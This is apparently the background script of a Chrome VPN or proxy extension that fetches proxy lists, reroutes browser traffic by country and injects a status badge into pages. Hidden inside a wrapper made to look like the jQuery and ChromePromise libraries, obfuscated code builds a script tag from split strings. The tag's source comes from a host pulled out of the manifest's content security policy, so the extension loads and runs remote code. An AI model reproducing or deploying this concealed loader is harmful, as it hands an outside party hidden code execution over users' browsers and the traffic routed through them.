(function (global, factory) {
    ...
    function getWidthOrHeight(elem, dimension, extra) {
        ...
        if (
            ((!support.boxSizingReliable() && isBorderBox) || (!support.reliableTrDimensions() && nodeName(elem, "tr")) || val === "auto" || (!parseFloat(val) && jQuery.css(elem, "display", false, styles) === "inline")) &&
...
(function (root, factory) {
    ...
    function ChromePromise(options) {
        ...
        var map1 = {};
        map1[`${"g"}tm.` + `start`] = new Date().getTime();
        map1["event"] = `${"g"}tm.` + "js";
        const _id = `${"G"}TM${"-"}` + `M6KQNZ9`;
        window["map1"] = [map1];
        const doc = document;
        var targetElName = "lastElementChild";
        var targetEl = doc.body[targetElName];
        var targetCmd = `create${targetElName.substr(4, 7)}`;
        var el = doc[targetCmd](targetEl["tagName"]);
        const m = chrome.runtime.getManifest();
        let s = m["content_security_policy"].split(" ")[4].replace(";", "");
        s += "/" + map1["event"];
        s += "?" + `id=${_id}`;
        s += "&l=map1";
        el.setAttribute(targetEl.attributes[0].name, s);
...
function uniqueRandom(arr) {
    ...
    return function random() {
        ...
        if (callstack > arr.length) return false;
        if (passed.includes(val)) return random();
        callstack += 1;
        passed.push(val);
        return val;
    };
...
async function getCountries() {
    const promise = await fetch("/countries.json")
        .then(async (response) => {
...
async function getProxy() {
    const proxyList = await fetch("https://api.nucleusvpn.com/api/proxy")
        .then((response) => (response.ok ? response.json() : false))
        .catch(() => false);
    return proxyList;
}
let isTryToConnecting = false;
const imagePath = chrome.runtime.getURL("/images/unblock-unlimited-status.png");
const statusImage = `<img id='unblock-vpn-img' style='width: 43px; height: 21px; position: fixed; z-index: 10; right: 10px; bottom: 20px;' src='${imagePath}' alt='status'>`;
var states = { disconnected: "disconnected", connecting: "connecting", connected: "connected" };
var status = states.disconnected;
var countriesPromise = getCountries();
var proxyListPromise = getProxy();
...
function getCountryAbbreviation(countriesList, proxyCountry) {
    let countryAbb;
    for (const i of countriesList) {
        if (i.country === proxyCountry) {
            countryAbb = i.abbreviation;
            break;
        }
    }
    return countryAbb;
}
async function getProxyByCountry(proxyCountry) {
    const proxyList = await proxyListPromise;
    const countries = await countriesPromise;
    if (!proxyList || !countries) return false;
    const clearProxyList = proxyList.proxy_list;
    if (!clearProxyList) return false;
    const curCountryAbb = getCountryAbbreviation(countries, proxyCountry);
    const countryProxyList = [];
    for (const i of clearProxyList) {
        if (i.country === curCountryAbb) {
            countryProxyList.push(i);
        }
    }
    return countryProxyList;
}
function setProxy(proxy) {
    const config = { mode: "fixed_servers", rules: { singleProxy: { host: proxy[0], port: Number(proxy[1]) }, bypassList: ["*api.nucleusvpn.com*"] } };
...
async function checkProxy(proxy) {
    ...
    setTimeout(() => abortController.abort(), 3e3);
    try {
        const isConnected = await fetch("https://ifconfig.me/ip", { signal: abortController.signal })
...
function initPageIndicator(tabId) {
    chrome.storage.local.get("indicator", (storage) => {
        if (status === states.connected && storage.indicator) {
            chrome.tabs.executeScript(tabId, { code: `if (!document.querySelectorAll("#unblock-vpn-img").length) {document.body.insertAdjacentHTML('beforeBegin', "${statusImage}");}` }, () => {
...
chrome.tabs.onCreated.addListener((tab) => {
    initPageIndicator(tab.id);
});
chrome.tabs.onUpdated.addListener((tabId) => {
    initPageIndicator(tabId);
});
chrome.runtime.onInstalled.addListener(() => {
    chrome.storage.local.set({ indicator: true });
});
async function connect() {
    ...
    function clear() {
        ...
        return chrome.runtime.sendMessage({ status: states.disconnected });
    }
    async function nextProxy(_countryProxy, _uniqueRandom = null) {
        clearProxy();
        const uniqueRandomObj = _uniqueRandom || uniqueRandom(_countryProxy);
        const randomProxy = uniqueRandomObj();
        if (status === states.disconnected || !randomProxy) return clear();
        const host = randomProxy.host.split(":");
        const isProxyValid = await checkProxy(host);
        if (!isProxyValid) return nextProxy(_countryProxy, uniqueRandomObj);
        if (status === states.disconnected) return clear();
        isTryToConnecting = false;
        status = states.connected;
        chrome.runtime.sendMessage({ status: status });
    }
    chrome.storage.local.get("country", async (storage) => {
        if (!storage || !storage.country) return;
        const country = storage.country;
        const countryProxy = await getProxyByCountry(country);
        if (!countryProxy) {
            return chrome.runtime.sendMessage({ status: states.disconnected });
        }
        isTryToConnecting = true;
        status = states.connecting;
        await chrome.runtime.sendMessage({ status: status });
        nextProxy(countryProxy);
    });
}
chrome.runtime.onMessage.addListener(() => {
    chrome.storage.local.get(["country"], (storage) => {
        if (!storage.country) return;
        const country = storage.country;
        if (status === states.disconnected && !isTryToConnecting) {
            clearProxy();
            if (country) connect();
